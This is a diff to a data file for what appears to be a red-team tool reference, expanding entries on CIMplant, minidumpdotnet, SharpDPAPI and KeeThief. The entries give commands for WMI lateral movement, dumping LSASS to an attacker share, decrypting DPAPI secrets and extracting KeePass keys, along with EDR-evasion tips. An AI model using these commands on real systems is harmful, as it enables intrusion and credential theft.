@@ -11397,68 +11397,176 @@ var TOOLKIT = [
         ]
       },
       {
-        id: "cimplant",
-        name: "CIMplant",
-        url: "https://github.com/FortyNorthSecurity/CIMplant",
-        description: "C# port of WMImplant — query systems and run commands over WMI/CIM for enumeration and lateral movement.",
-        brief: "CIMplant is a C# reimplementation of WMImplant that uses WMI (and DCOM/CIM) to gather information from and execute commands on remote Windows hosts, authenticating with supplied credentials. Because WMI is a normal management protocol, it blends into expected traffic; run in memory via execute-assembly it provides enumeration (basic_info, process listing) and command execution (command_exec) for lateral movement without SMB/PsExec-style artefacts.",
-        quickReference: [
-          { label: "Host info over WMI", cmd: "CIMplant.exe -s <host> -u <user> -p <pass> -d <domain> -c basic_info" },
-          { label: "Run a command", cmd: "CIMplant.exe -s <host> -u <user> -p <pass> -c command_exec --execute \"whoami\"" }
-        ],
-        sections: [
+        "id": "cimplant",
+        "name": "CIMplant",
+        "url": "https://github.com/FortyNorthSecurity/CIMplant",
+        "description": "C# port of WMImplant — query systems and run commands over WMI/CIM for enumeration and lateral movement.",
+        "brief": "CIMplant is a C# reimplementation of WMImplant that uses WMI (and DCOM/CIM) to gather information from and execute commands on remote Windows hosts, authenticating with supplied credentials. Because WMI is a normal management protocol, it blends into expected traffic; run in memory via execute-assembly it provides enumeration (basic_info, process listing) and command execution (command_exec) for lateral movement without SMB/PsExec-style artefacts.",
+        "quickReference": [
           {
-            title: "Usage (via Sliver execute-assembly)",
-            type: "commands",
-            commands: [
-              { label: "Enumerate a remote host", cmd: "execute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' '-s <host> -u <user> -p <pass> -d <domain> -c basic_info'" },
-              { label: "Execute a command remotely", cmd: "execute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' '-s <host> -u <user> -p <pass> -c command_exec --execute \"whoami\"'" }
+            "label": "Host info over WMI",
+            "cmd": "CIMplant.exe -s <host> -u <user> -p <pass> -d <domain> -c basic_info"
+          },
+          {
+            "label": "Run a command",
+            "cmd": "CIMplant.exe -s <host> -u <user> -p <pass> -c command_exec --execute \"whoami\""
+          },
+          {
+            "label": "List processes over WMI",
+            "cmd": "CIMplant.exe -s <host> -u <u> -p <p> -c ps"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Flags & key commands",
+            "type": "table",
+            "columns": [
+              "Item",
+              "Description"
+            ],
+            "rows": [
+              [
+                "-s <host> / -u / -d / -p",
+                "Target host and credentials"
+              ],
+              [
+                "-c <command>",
+                "Operation: basic_info, command_exec, ps, cat, ls, download, upload, ..."
+              ],
+              [
+                "--execute \"<cmd>\"",
+                "The command line used by command_exec"
+              ],
+              [
+                "-m wmi|dcom",
+                "Connection method"
+              ],
+              [
+                "--nops",
+                "Run command_exec via Win32_Process instead of a PowerShell runspace"
+              ],
+              [
+                "reg_mod / service_mod / logon_events",
+                "Registry & service changes, and logon-session enumeration"
+              ]
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "CIMplant — GitHub (FortyNorthSecurity)", url: "https://github.com/FortyNorthSecurity/CIMplant" },
-              { label: "Vulns — Remote Execution / Lateral Movement", url: "vulns.html" }
+            "title": "Usage (via Sliver execute-assembly)",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Enumerate a remote host",
+                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' '-s <host> -u <user> -p <pass> -d <domain> -c basic_info'"
+              },
+              {
+                "label": "Execute a command remotely",
+                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' '-s <host> -u <user> -p <pass> -c command_exec --execute \"whoami\"'"
+              }
+            ]
+          },
+          {
+            "title": "Notes & Tips",
+            "type": "notes",
+            "items": [
+              "C# port of WMImplant: everything rides WMI/CIM, so there is no new service or SMB file write — useful where service-based exec is watched.",
+              "Packed into one assembly for execute-assembly; PowerShell-backed commands still touch the CLR, so pair with an AMSI bypass on monitored hosts."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "CIMplant — GitHub (FortyNorthSecurity)",
+                "url": "https://github.com/FortyNorthSecurity/CIMplant"
+              },
+              {
+                "label": "Vulns — Remote Execution / Lateral Movement",
+                "url": "vulns.html"
+              }
             ]
           }
         ]
       },
       {
-        id: "minidumpdotnet",
-        name: "minidumpdotnet",
-        url: "https://github.com/pheepheep/minidumpdotnet",
-        description: "Managed .NET tool that dumps process memory (LSASS) via a custom MiniDumpWriteDump implementation to evade EDR hooks.",
-        brief: "minidumpdotnet is a .NET tool that produces a minidump of a target process — typically LSASS — using its own implementation of the MiniDumpWriteDump() routine rather than the well-hooked API in dbghelp.dll. That custom implementation is what lets it evade endpoint products (e.g. Microsoft Defender for Endpoint) that hook the standard call. It is paired with a helper such as FindLSASSPID to locate the LSASS process, and is best run from an SMB share (not over HTTP) to reduce detection; the resulting dump is parsed offline with mimikatz/pypykatz.",
-        quickReference: [
-          { label: "Find the LSASS PID", cmd: "FindLSASSPID.exe" },
-          { label: "Dump LSASS to a share", cmd: "minidumpdotnet.exe <pid> \\\\host\\share\\lsass.dmp" }
-        ],
-        sections: [
+        "id": "minidumpdotnet",
+        "name": "minidumpdotnet",
+        "url": "https://github.com/pheepheep/minidumpdotnet",
+        "description": "Managed .NET tool that dumps process memory (LSASS) via a custom MiniDumpWriteDump implementation to evade EDR hooks.",
+        "brief": "minidumpdotnet is a .NET tool that produces a minidump of a target process — typically LSASS — using its own implementation of the MiniDumpWriteDump() routine rather than the well-hooked API in dbghelp.dll. That custom implementation is what lets it evade endpoint products (e.g. Microsoft Defender for Endpoint) that hook the standard call. It is paired with a helper such as FindLSASSPID to locate the LSASS process, and is best run from an SMB share (not over HTTP) to reduce detection; the resulting dump is parsed offline with mimikatz/pypykatz.",
+        "quickReference": [
           {
-            title: "Usage (run from an SMB share)",
-            type: "commands",
-            commands: [
-              { label: "1. Host the tools on an SMB share", cmd: "mkdir 'C:\\Tools\\<share>'\nexecute -o -t 40 cmd /c \"net share <share>=C:\\Tools\\<share> /grant:Everyone,FULL\"\nupload -t 180 '/path/minidumpdotnet.exe' '\\\\host\\<share>\\minidumpdotnet.exe'\nupload -t 180 '/path/FindLSASSPID.exe'  '\\\\host\\<share>\\FindLSASSPID.exe'" },
-              { label: "2. Find the PID and dump LSASS to the share", cmd: "# run FindLSASSPID to get the PID, then dump straight to the share (avoid HTTP):\nminidumpdotnet.exe <pid> \\\\host\\<share>\\lsass.dmp\n# parse offline: mimikatz 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords'" }
+            "label": "Find the LSASS PID",
+            "cmd": "FindLSASSPID.exe"
+          },
+          {
+            "label": "Dump LSASS to a share",
+            "cmd": "minidumpdotnet.exe <pid> \\\\host\\share\\lsass.dmp"
+          },
+          {
+            "label": "Parse the dump off-host",
+            "cmd": "pypykatz lsa minidump out.dmp"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Usage",
+            "type": "table",
+            "columns": [
+              "Command",
+              "Description"
+            ],
+            "rows": [
+              [
+                "FindLSASSPID.exe",
+                "Helper that prints the current LSASS PID"
+              ],
+              [
+                "minidumpdotnet.exe <pid> <outfile>",
+                "Write a full minidump of <pid> to <outfile>"
+              ],
+              [
+                "<outfile> = \\\\host\\share\\out.dmp",
+                "Write straight to an attacker SMB share so nothing lands on the target disk"
+              ]
             ]
           },
           {
-            title: "Why It Evades EDR",
-            type: "notes",
-            items: [
+            "title": "Usage (run from an SMB share)",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "1. Host the tools on an SMB share",
+                "cmd": "mkdir 'C:\\Tools\\<share>'\nexecute -o -t 40 cmd /c \"net share <share>=C:\\Tools\\<share> /grant:Everyone,FULL\"\nupload -t 180 '/path/minidumpdotnet.exe' '\\\\host\\<share>\\minidumpdotnet.exe'\nupload -t 180 '/path/FindLSASSPID.exe'  '\\\\host\\<share>\\FindLSASSPID.exe'"
+              },
+              {
+                "label": "2. Find the PID and dump LSASS to the share",
+                "cmd": "# run FindLSASSPID to get the PID, then dump straight to the share (avoid HTTP):\nminidumpdotnet.exe <pid> \\\\host\\<share>\\lsass.dmp\n# parse offline: mimikatz 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords'"
+              }
+            ]
+          },
+          {
+            "title": "Why It Evades EDR",
+            "type": "notes",
+            "items": [
               "The common LSASS-dump detections hook the MiniDumpWriteDump() API in dbghelp.dll and flag any caller opening a handle to LSASS and writing a dump. minidumpdotnet reimplements the dump logic itself, so it never calls the hooked API — the behaviour the sensor keys on doesn't occur through the monitored path.",
               "Running it from an SMB share rather than fetching over HTTP avoids the web-download detection surface and keeps the tool off local disk.",
               "It still needs the SeDebugPrivilege / admin context to open LSASS, so it follows a privilege-escalation step."
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "minidumpdotnet — GitHub", url: "https://github.com/pheepheep/minidumpdotnet" },
-              { label: "Vulns — LSASS Dumping", url: "vulns.html" }
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "minidumpdotnet — GitHub",
+                "url": "https://github.com/pheepheep/minidumpdotnet"
+              },
+              {
+                "label": "Vulns — LSASS Dumping",
+                "url": "vulns.html"
+              }
             ]
           }
         ]
@@ -12195,122 +12303,194 @@ var TOOLKIT = [
         ]
       },
       {
-              "id": "sharpdpapi",
-              "name": "SharpDPAPI",
-              "url": "https://github.com/GhostPack/SharpDPAPI",
-              "description": "Decrypts DPAPI-protected secrets — browser passwords, RDP, Wi-Fi, credentials and vaults.",
-              "brief": "SharpDPAPI is the C# tool for looting secrets protected by Windows' Data Protection API (DPAPI). Windows encrypts a lot of user secrets — saved browser and RDP passwords, Wi-Fi keys, Credential Manager entries, scheduled-task credentials — with per-user DPAPI master keys. SharpDPAPI triages and decrypts them, either with the user's password/hash, from SYSTEM, or with the domain DPAPI backup key.\n\nThe domain backup key is the crown jewel: a Domain Admin can extract it once and then decrypt any user's DPAPI secrets across the domain, offline. SharpDPAPI (and its Python cousin DonPAPI) turn a foothold into a rich set of reusable credentials.",
-              "quickReference": [
-                      {
-                              "label": "Triage current user's secrets",
-                              "cmd": "SharpDPAPI.exe triage"
-                      },
-                      {
-                              "label": "Decrypt with the domain backup key",
-                              "cmd": "SharpDPAPI.exe masterkeys /pvk:<domain_backupkey.pvk>"
-                      },
-                      {
-                              "label": "Credentials / vaults",
-                              "cmd": "SharpDPAPI.exe credentials\nSharpDPAPI.exe vaults"
-                      }
+        "id": "sharpdpapi",
+        "name": "SharpDPAPI",
+        "url": "https://github.com/GhostPack/SharpDPAPI",
+        "description": "Decrypts DPAPI-protected secrets — browser passwords, RDP, Wi-Fi, credentials and vaults.",
+        "brief": "SharpDPAPI is the C# tool for looting secrets protected by Windows' Data Protection API (DPAPI). Windows encrypts a lot of user secrets — saved browser and RDP passwords, Wi-Fi keys, Credential Manager entries, scheduled-task credentials — with per-user DPAPI master keys. SharpDPAPI triages and decrypts them, either with the user's password/hash, from SYSTEM, or with the domain DPAPI backup key.\n\nThe domain backup key is the crown jewel: a Domain Admin can extract it once and then decrypt any user's DPAPI secrets across the domain, offline. SharpDPAPI (and its Python cousin DonPAPI) turn a foothold into a rich set of reusable credentials.",
+        "quickReference": [
+          {
+            "label": "Triage current user's secrets",
+            "cmd": "SharpDPAPI.exe triage"
+          },
+          {
+            "label": "Decrypt with the domain backup key",
+            "cmd": "SharpDPAPI.exe masterkeys /pvk:<domain_backupkey.pvk>"
+          },
+          {
+            "label": "Credentials / vaults",
+            "cmd": "SharpDPAPI.exe credentials\nSharpDPAPI.exe vaults"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Commands & flags",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it decrypts / does"
+            ],
+            "rows": [
+              [
+                "triage",
+                "All reachable secrets for the current user, in one pass"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Triage everything for the current user",
-                                              "cmd": "SharpDPAPI.exe triage        # browsers, creds, vaults, RDP, etc."
-                                      },
-                                      {
-                                              "label": "Domain-wide with the backup key",
-                                              "cmd": "# extract the backup key once as DA (mimikatz lsadump::backupkeys or SharpDPAPI backupkey), then:\nSharpDPAPI.exe masterkeys /pvk:key.pvk\nSharpDPAPI.exe credentials /pvk:key.pvk"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Access to masterkey files and the domain backup key is the signal. The backup key is the highest-value: guard it and rotate after DA compromise.",
-                                      "DonPAPI automates the same across many hosts from Linux — see the Credential Storage theory page."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "SharpDPAPI — GitHub (GhostPack)",
-                                              "url": "https://github.com/GhostPack/SharpDPAPI"
-                                      },
-                                      {
-                                              "label": "Theory — Windows Credential Storage",
-                                              "url": "theory/2026-08-18-windows-credential-storage.html"
-                                      }
-                              ]
-                      }
+              [
+                "machinetriage",
+                "Machine-scope secrets (run as SYSTEM)"
+              ],
+              [
+                "masterkeys [/pvk:<key>]",
+                "User masterkeys; with the domain backup key, any user"
+              ],
+              [
+                "credentials / vaults",
+                "Credential Manager blobs and the Windows Vault"
+              ],
+              [
+                "rdg",
+                "Saved Remote Desktop (.rdg) credentials"
+              ],
+              [
+                "keepass",
+                "KeePass key material from the config/process"
+              ],
+              [
+                "certificates [/machine]",
+                "Exportable certificates and their private keys"
+              ],
+              [
+                "backupkey /server:<dc>",
+                "Retrieve the domain DPAPI backup key (needs DA)"
+              ],
+              [
+                "/password: /server: /target: /ntlm:",
+                "Common qualifiers for scope and auth"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Triage everything for the current user",
+                "cmd": "SharpDPAPI.exe triage        # browsers, creds, vaults, RDP, etc."
+              },
+              {
+                "label": "Domain-wide with the backup key",
+                "cmd": "# extract the backup key once as DA (mimikatz lsadump::backupkeys or SharpDPAPI backupkey), then:\nSharpDPAPI.exe masterkeys /pvk:key.pvk\nSharpDPAPI.exe credentials /pvk:key.pvk"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Access to masterkey files and the domain backup key is the signal. The backup key is the highest-value: guard it and rotate after DA compromise.",
+              "DonPAPI automates the same across many hosts from Linux — see the Credential Storage theory page."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "SharpDPAPI — GitHub (GhostPack)",
+                "url": "https://github.com/GhostPack/SharpDPAPI"
+              },
+              {
+                "label": "Theory — Windows Credential Storage",
+                "url": "theory/2026-08-18-windows-credential-storage.html"
+              }
+            ]
+          }
+        ]
       },
       {
-              "id": "keethief",
-              "name": "KeeThief",
-              "url": "https://github.com/GhostPack/KeeThief",
-              "description": "Extracts KeePass master-key material from a running KeePass process to open the database.",
-              "brief": "KeeThief extracts the key material of an unlocked KeePass database from the memory of a running KeePass process. Password managers are a jackpot on a workstation — one database often holds domain, service and privileged credentials — but they are encrypted at rest. KeeThief sidesteps that by pulling the composite master key from the live process, letting you decrypt the .kdbx.\n\nIt targets KeePass specifically (a very common enterprise choice). Related tricks include a malicious KeePass trigger/plugin for persistence, and CVE-2023-32784 to recover the master password from a process dump. Whichever route, the payoff is a trove of reusable credentials.",
-              "quickReference": [
-                      {
-                              "label": "Extract keys from running KeePass",
-                              "cmd": "KeeThief.exe"
-                      },
-                      {
-                              "label": "PowerShell variant",
-                              "cmd": "Get-KeePassDatabaseKey"
-                      },
-                      {
-                              "label": "Find KeePass first",
-                              "cmd": "tasklist | findstr /I keepass"
-                      }
+        "id": "keethief",
+        "name": "KeeThief",
+        "url": "https://github.com/GhostPack/KeeThief",
+        "description": "Extracts KeePass master-key material from a running KeePass process to open the database.",
+        "brief": "KeeThief extracts the key material of an unlocked KeePass database from the memory of a running KeePass process. Password managers are a jackpot on a workstation — one database often holds domain, service and privileged credentials — but they are encrypted at rest. KeeThief sidesteps that by pulling the composite master key from the live process, letting you decrypt the .kdbx.\n\nIt targets KeePass specifically (a very common enterprise choice). Related tricks include a malicious KeePass trigger/plugin for persistence, and CVE-2023-32784 to recover the master password from a process dump. Whichever route, the payoff is a trove of reusable credentials.",
+        "quickReference": [
+          {
+            "label": "Extract keys from running KeePass",
+            "cmd": "KeeThief.exe"
+          },
+          {
+            "label": "PowerShell variant",
+            "cmd": "Get-KeePassDatabaseKey"
+          },
+          {
+            "label": "Find KeePass first",
+            "cmd": "tasklist | findstr /I keepass"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Usage",
+            "type": "table",
+            "columns": [
+              "Step",
+              "Command"
+            ],
+            "rows": [
+              [
+                "Confirm KeePass is running",
+                "tasklist | findstr /I keepass"
               ],
-              "sections": [
-                      {
-                              "title": "Usage",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Pull the master key from memory",
-                                              "cmd": "KeeThief.exe        # locates KeePass, extracts the composite key -> decrypt the .kdbx offline"
-                                      },
-                                      {
-                                              "label": "Alternatives",
-                                              "cmd": "# CVE-2023-32784: recover the master password from a KeePass process/minidump\n# or drop a malicious KeePass trigger to exfil entries on next unlock"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "Requires the database to be unlocked (process running) or a process dump. Signal: process access to KeePass, unusual minidumps, new triggers/plugins.",
-                                      "Defence: lock the DB when idle, use a key file / Windows Hello, and restrict local admin so memory access is harder."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "KeeThief — GitHub (GhostPack)",
-                                              "url": "https://github.com/GhostPack/KeeThief"
-                                      },
-                                      {
-                                              "label": "Theory — Windows Credential Storage",
-                                              "url": "theory/2026-08-18-windows-credential-storage.html"
-                                      }
-                              ]
-                      }
+              [
+                "Extract the key material",
+                "KeeThief.exe"
+              ],
+              [
+                "PowerShell variant",
+                "Get-KeePassDatabaseKey"
+              ],
+              [
+                "Then open the database",
+                "Use the recovered key parts (master password / keyfile / Windows-account) to open the .kdbx"
               ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Pull the master key from memory",
+                "cmd": "KeeThief.exe        # locates KeePass, extracts the composite key -> decrypt the .kdbx offline"
+              },
+              {
+                "label": "Alternatives",
+                "cmd": "# CVE-2023-32784: recover the master password from a KeePass process/minidump\n# or drop a malicious KeePass trigger to exfil entries on next unlock"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "Requires the database to be unlocked (process running) or a process dump. Signal: process access to KeePass, unusual minidumps, new triggers/plugins.",
+              "Defence: lock the DB when idle, use a key file / Windows Hello, and restrict local admin so memory access is harder."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "KeeThief — GitHub (GhostPack)",
+                "url": "https://github.com/GhostPack/KeeThief"
+              },
+              {
+                "label": "Theory — Windows Credential Storage",
+                "url": "theory/2026-08-18-windows-credential-storage.html"
+              }
+            ]
+          }
+        ]
       }
     ]
   },
